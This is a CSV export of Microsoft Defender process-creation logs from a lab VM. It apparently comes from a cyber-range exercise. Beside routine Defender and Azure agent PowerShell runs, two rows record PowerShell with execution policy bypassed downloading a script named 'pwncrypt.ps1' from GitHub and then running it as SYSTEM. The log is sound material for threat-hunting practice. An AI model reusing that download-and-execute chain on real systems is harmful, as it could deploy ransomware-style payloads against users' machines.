Timestamp,DeviceId,DeviceName,ActionType,FileName,FolderPath,SHA1,SHA256,MD5,FileSize,ProcessVersionInfoCompanyName,ProcessVersionInfoProductName,ProcessVersionInfoProductVersion,ProcessVersionInfoInternalFileName,ProcessVersionInfoOriginalFileName,ProcessVersionInfoFileDescription,ProcessId,ProcessCommandLine,ProcessIntegrityLevel,ProcessTokenElevation,ProcessCreationTime,AccountDomain,AccountName,AccountSid,AccountUpn,AccountObjectId,LogonId,InitiatingProcessAccountDomain,InitiatingProcessAccountName,InitiatingProcessAccountSid,InitiatingProcessAccountUpn,InitiatingProcessAccountObjectId,InitiatingProcessLogonId,InitiatingProcessIntegrityLevel,InitiatingProcessTokenElevation,InitiatingProcessSHA1,InitiatingProcessSHA256,InitiatingProcessMD5,InitiatingProcessFileName,InitiatingProcessFileSize,InitiatingProcessVersionInfoCompanyName,InitiatingProcessVersionInfoProductName,InitiatingProcessVersionInfoProductVersion,InitiatingProcessVersionInfoInternalFileName,InitiatingProcessVersionInfoOriginalFileName,InitiatingProcessVersionInfoFileDescription,InitiatingProcessId,InitiatingProcessCommandLine,InitiatingProcessCreationTime,InitiatingProcessFolderPath,InitiatingProcessParentId,InitiatingProcessParentFileName,InitiatingProcessParentCreationTime,InitiatingProcessSignerType,InitiatingProcessSignatureStatus,ReportId,AppGuardContainerId,AdditionalFields,InitiatingProcessSessionId,IsInitiatingProcessRemoteSession,InitiatingProcessRemoteSessionDeviceName,InitiatingProcessRemoteSessionIP,CreatedProcessSessionId,IsProcessRemoteSession,ProcessRemoteSessionDeviceName,ProcessRemoteSessionIP,ProcessUniqueId,InitiatingProcessUniqueId
"Jun 15, 2025 1:39:52 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,7252,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '671d163865ed6e6f4e6d40478bb315ec3cc97bda75d315a31e012fb17beffb50')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\05f2c576-9ed5-41eb-9b1e-1b653eebfdff.ps1' }""",System,TokenElevationTypeDefault,"Jun 15, 2025 1:39:52 PM",nt authority,system,S-1-5-18,,,0,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,6172,"""SenseIR.exe"" ""OfflineSenseIR"" ""3536"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MzYzNn0=""","Jun 15, 2025 1:39:40 PM",c:\program files\windows defender advanced threat protection\senseir.exe,6008,MsSense.exe,"Jun 15, 2025 1:38:27 PM",OsVendor,Valid,297,,,0,0,,,0,0,,,1970324836974949,1970324836974944
"Jun 15, 2025 1:44:12 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,6860,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\8e0b85ee-da90-46d9-b939-75081a1ceb3a.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\8e0b85ee-da90-46d9-b939-75081a1ceb3a.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '7af0cfd8f7931533974bfa3422043079ee82e57f4c6e39bffb61ebdf21536e5e')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\8e0b85ee-da90-46d9-b939-75081a1ceb3a.ps1' }""",System,TokenElevationTypeDefault,"Jun 15, 2025 1:44:12 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,6172,"""SenseIR.exe"" ""OfflineSenseIR"" ""3536"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MzYzNn0=""","Jun 15, 2025 1:39:40 PM",c:\program files\windows defender advanced threat protection\senseir.exe,6008,MsSense.exe,"Jun 15, 2025 1:38:27 PM",OsVendor,Valid,1111,,,0,0,,,0,0,,,1970324836975000,1970324836974944
"Jun 15, 2025 1:58:14 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,7440,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '420e8a8811873976aabed8aa7ac35735813707b91ab52e2f74f24d45dcb751eb')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\046a3caf-d9ec-4da6-a32a-fb148992596b.ps1' }""",System,TokenElevationTypeDefault,"Jun 15, 2025 1:58:14 PM",nt authority,local service,S-1-5-19,,,997,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,6172,"""SenseIR.exe"" ""OfflineSenseIR"" ""3536"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MzYzNn0=""","Jun 15, 2025 1:39:40 PM",c:\program files\windows defender advanced threat protection\senseir.exe,6008,MsSense.exe,"Jun 15, 2025 1:38:27 PM",OsVendor,Valid,4558,,,0,0,,,0,0,,,1970324836975095,1970324836974944
"Jun 15, 2025 2:02:18 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,3396,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,System,TokenElevationTypeDefault,"Jun 15, 2025 2:02:18 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,4860,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""","Jun 15, 2025 2:02:18 PM",c:\windows\system32\cmd.exe,2156,WindowsAzureGuestAgent.exe,"Jun 15, 2025 1:28:46 PM",OsVendor,Valid,4800,,,0,0,,,0,0,,,1970324836975106,1970324836975104
"Jun 15, 2025 2:09:24 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,7008,"powershell.exe -ExecutionPolicy AllSigned -NoProfile -NonInteractive -Command ""& {$OutputEncoding = [Console]::OutputEncoding =[System.Text.Encoding]::UTF8;$scriptFileStream = [System.IO.File]::Open('C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\aceb19ff-8484-4db4-b8f6-f5a8d03a8c4a.ps1', [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::Read);$calculatedHash = Microsoft.PowerShell.Utility\Get-FileHash 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\aceb19ff-8484-4db4-b8f6-f5a8d03a8c4a.ps1' -Algorithm SHA256;if (!($calculatedHash.Hash -eq '153565a82e6ef1ee47ab1d4615394355b84e2cc70296974790e3cf6f33fec2f5')) { exit 323;}; . 'C:\ProgramData\Microsoft\Windows Defender Advanced Threat Protection\DataCollection\8799.13010684.0.13010684-44df2f8b8ed4b8bf86a33a19f943b8cbdd19f110\aceb19ff-8484-4db4-b8f6-f5a8d03a8c4a.ps1' }""",System,TokenElevationTypeDefault,"Jun 15, 2025 2:09:24 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,0,System,TokenElevationTypeDefault,1c36c1e529b52ee865bce0b733f58b4b9cdbe10b,e4548f82148cd26786258be78c0b09b19dd058a775f7658cb132f10a196e96f0,73eddfa043a2beb9530ff55d0bbc22d7,senseir.exe,6051960,Microsoft Corporation,Microsoft® Windows® Operating System,10.8797.25857.1000,SenseIR.exe,SenseIR.exe,Windows Defender Advanced Threat Protection Sense IR module,6172,"""SenseIR.exe"" ""OfflineSenseIR"" ""3536"" ""eyJDb21tYW5kSWQiOiIiLCJEb3dubG9hZEZpbGVBY3Rpb25Db25maWciOm51bGwsIkRvd25sb2FkVHJ1c3RlZENlcnRpZmljYXRlc0NoYWlucyI6bnVsbCwiRW5hYmxlU2xlZXBTdXNwZW5zaW9uIjowLCJNYXhXYWl0Rm9yTmV3QWN0aW9uc0luTXMiOjEyNjAwMDAsIk9yZ0lkIjoiIiwiUnVuUHNTY3JpcHRBY3Rpb25Db25maWciOnsiZW5hYmxlIjp0cnVlfSwiYWNjZXB0U2ltdWxhdG9yU2lnbmluZyI6MCwib2ZmbGluZUlyUGlwZUhhbmRsZSI6MzYzNn0=""","Jun 15, 2025 1:39:40 PM",c:\program files\windows defender advanced threat protection\senseir.exe,6008,MsSense.exe,"Jun 15, 2025 1:38:27 PM",OsVendor,Valid,5163,,,0,0,,,0,0,,,1970324836975113,1970324836974944
"Jun 15, 2025 2:13:09 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,1644,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,System,TokenElevationTypeDefault,"Jun 15, 2025 2:13:09 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,3172,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""","Jun 15, 2025 2:13:09 PM",c:\windows\system32\cmd.exe,2156,WindowsAzureGuestAgent.exe,"Jun 15, 2025 1:28:46 PM",OsVendor,Valid,5369,,,0,0,,,0,0,,,1970324836975133,1970324836975131
"Jun 15, 2025 2:13:16 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,3124,powershell  -ExecutionPolicy Unrestricted -File script0.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:13:16 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,4332,"""cmd"" /Cpowershell -ExecutionPolicy Unrestricted -File script0.ps1","Jun 15, 2025 2:13:15 PM",c:\windows\system32\cmd.exe,6616,RunCommandExtension.exe,"Jun 15, 2025 2:13:15 PM",OsVendor,Valid,5413,,,0,0,,,0,0,,,1970324836975141,1970324836975139
"Jun 15, 2025 2:13:16 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,1928,powershell.exe  -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:13:16 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,5536,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1","Jun 15, 2025 2:13:16 PM",c:\windows\system32\cmd.exe,3124,powershell.exe,"Jun 15, 2025 2:13:16 PM",OsVendor,Valid,5415,,,0,0,,,0,0,,,1970324836975143,1970324836975142
"Jun 15, 2025 2:13:20 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,4444,powershell.exe  -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1,System,TokenElevationTypeDefault,"Jun 15, 2025 2:13:20 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,5216,"""cmd.exe"" /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1","Jun 15, 2025 2:13:20 PM",c:\windows\system32\cmd.exe,3124,powershell.exe,"Jun 15, 2025 2:13:16 PM",OsVendor,Valid,5437,,,0,0,,,0,0,,,1970324836975145,1970324836975144
"Jun 15, 2025 2:25:12 PM",c43912fa23e2b94c5717aafe3030f7bd3b20d9e7,michaelvm,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,801262e122db6a2e758962896f260b55bbd0136a,9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3,2e5a8590cf6848968fc23de3fa1e25f1,455680,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.3996,POWERSHELL,PowerShell.EXE,Windows PowerShell,4444,powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.ps1 -StartAsyncProcess ,System,TokenElevationTypeDefault,"Jun 15, 2025 2:25:12 PM",nt authority,system,S-1-5-18,,,999,nt authority,system,S-1-5-18,,,999,System,TokenElevationTypeDefault,df79c86fdd11b9ccb89148458e509f879c72566c,badf4752413cb0cbdc03fb95820ca167f0cdc63b597ccdb5ef43111180e088b0,2b40c98ed0f7a1d3b091a3e8353132dc,cmd.exe,289792,Microsoft Corporation,Microsoft® Windows® Operating System,10.0.19041.4355,cmd,Cmd.Exe,Windows Command Processor,4956,"cmd.exe /c """"C:\Packages\Plugins\Microsoft.GuestConfiguration.ConfigurationforWindows\1.29.92.0\bin\enable.cmd""""","Jun 15, 2025 2:25:11 PM",c:\windows\system32\cmd.exe,2156,WindowsAzureGuestAgent.exe,"Jun 15, 2025 1:28:46 PM",OsVendor,Valid,5708,,,0,0,,,0,0,,,1970324836975171,1970324836975163
